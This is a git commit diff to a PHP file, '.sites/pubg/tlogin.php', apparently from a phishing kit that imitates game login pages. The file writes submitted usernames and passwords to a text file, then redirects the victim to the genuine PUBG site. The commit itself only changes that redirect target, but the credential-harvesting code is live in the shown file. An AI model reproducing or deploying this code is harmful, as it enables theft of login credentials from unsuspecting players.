3ae8b0dce92bba9c1b6b9bfa290962a36ce0cacf
Kamanati <98698457+Kamanati@users.noreply.github.com>
2022-06-04 15:00:45 +0530

    Update tlogin.php

--- .sites/pubg/tlogin.php
+++ .sites/pubg/tlogin.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", " Username: " . $_GET['Username_TW'] . " Pass: " . $_GET['Password_TW'] . "\n", FILE_APPEND);
-header('Location: https://garena.ff.reward.com/login');
+header('Location: https://na.battlegrounds.pubg.com/');
 exit();
 ?>
